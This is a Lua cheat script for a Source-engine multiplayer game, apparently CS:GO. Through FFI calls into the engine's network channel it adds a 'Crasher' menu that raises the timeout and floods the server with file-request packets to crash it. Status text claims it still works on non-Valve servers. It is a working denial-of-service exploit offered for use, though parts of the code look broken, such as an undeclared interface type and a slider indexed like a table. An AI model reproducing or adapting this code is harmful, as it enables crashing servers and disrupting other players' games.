local ffi = ffi
ffi.cdef [[
    typedef void*(__thiscall* getnetchannel_t)(void*); // engineclient 78

    typedef void(__thiscall* set_timeout_t)(void*, float, bool); // netchan 31
    typedef unsigned int(__thiscall* request_file_t)(void*, const char*, bool); // netchan 62

    void* GetProcAddress(void* hModule, const char* lpProcName);
    void* GetModuleHandleA(const char* lpModuleName);
    
    typedef struct {
        uint8_t r;
        uint8_t g;
        uint8_t b;
        uint8_t a;
    } color_struct_t;

    typedef void (*console_color_print)(const color_struct_t&, const char*, ...);

    typedef void* (__thiscall* get_client_entity_t)(void*, int);
]]

local ffi_helpers = {
    color_print_fn = ffi.cast("console_color_print", ffi.C.GetProcAddress(ffi.C.GetModuleHandleA("tier0.dll"), "?ConColorMsg@@YAXABVColor@@PBDZZ")),
    color_print = function(self, text, color)
        local col = ffi.new("color_struct_t")

        col.r = color.r * 255
        col.g = color.g * 255
        col.b = color.b * 255
        col.a = color.a * 255

        self.color_print_fn(col, text)
    end
}

local function coloredPrint(color, text)
    ffi_helpers.color_print(ffi_helpers, text, color)
end

local function GetInterface(dll_name, interface_name)
    local CreateInterface = ffi.cast("tCreateInterface", ffi.C.GetProcAddress(ffi.C.GetModuleHandleA(dll_name), "CreateInterface"));
    local interface = CreateInterface(interface_name, ffi.new("int*"));
    return interface;
end

local engineclient = ffi.cast(ffi.typeof("void***"), GetInterface("engine.dll", "VEngineClient014"));
local getnetchannel = ffi.cast("getnetchannel_t", engineclient[0][78]);

local netchannel = {}
do
    function vfunc_wrapper(type, index)
        return function(...)
            -- only did this for netchannel, you can probably extend it to make it a proper wrapper
            local netchannel = ffi.cast(ffi.typeof("void***"), getnetchannel(engineclient))
            local fn = ffi.cast(type, netchannel[0][index])

            return fn(netchannel, ...)
        end
    end

    netchannel.set_timeout = vfunc_wrapper("set_timeout_t", 31)
    netchannel.request_file = vfunc_wrapper("request_file_t", 62)
end

local crasher = gui.Groupbox(gui.Reference( "Settings", "Advanced", "Manage advanced settings"), "Crasher")
local crashmanual = gui.Checkbox(crasher, "crasher.manual", "Manual Crasher", false)
local crashslider = gui.Slider(crasher, "crasher.packets", "Packets", 1024, 1, 8192);
local indicatorcrash = gui.Checkbox(crasher, "crash.indicator", "Indicator", false);
local crashlogs = gui.Checkbox(crasher, "crash.logs", "Console Logs", false)
local ishotomg = false
local isinairomg = false
local IsConnected = entities.GetLocalPlayer()
callbacks.Register("FireGameEvents", function(event)
    if event:GetName() == "player_jump" then
        isinairomg = true
    end
end)
gui.Text(crasher, "Status:")
gui.Text(crasher, "NON-VALVE SERVERS: UNPATCHED")
gui.Text(crasher, "VALVE SERVERS: PATCHED")
gui.Text(crasher, "Last Updated: 30th Of May 2021")
gui.Text(crasher, "DEVELOPED BY SmoK#0911")

local packetcount = 0
callbacks.Register("CreateMove", function()
    if not IsConnected then return end
    netchannel.set_timeout(3600, false);
    if isinairomg then
        for i = 1, crashslider do
            packetcount = crashslider[i]
            netchannel.request_file(".txt", false);
        end
        isinairomg = false
    end
end)

callbacks.Register("CreateMove", function()
    if not IsConnected then return end
    netchannel.set_timeout(3600, false);
    if crashmanual:GetValue() then
        for i = 1, crashslider do
            packetcount = crashslider[i]
            netchannel.request_file(".txt", false);
            packetcount = packetcount + 1
        end
    else
        packetcount = 0
    end
end)
callbacks.Register("Draw", function()
    if not IsConnected then return end
    local x,y = draw.GetScreenSize()
    -- netchannel.set_timeout(3600, false);
    if crashmanual:GetValue() then
        if indicatorcrash:GetValue() then
            --local x_unadd = Render.TextSizeCustom("Crashing [" .. packetcount .."]", 15)
            draw.Color(1, 1, 1, 255)
            draw.Text(x / 2, y / 2 - y / 4, "Crashing [" .. packetcount .. "]")
        end
        if crashlogs:GetValue() then
            coloredPrint(1,1,1,1, "crashing server")
            client.Command(print("[+] crashing server...\n"), true)
        end
    end
end)
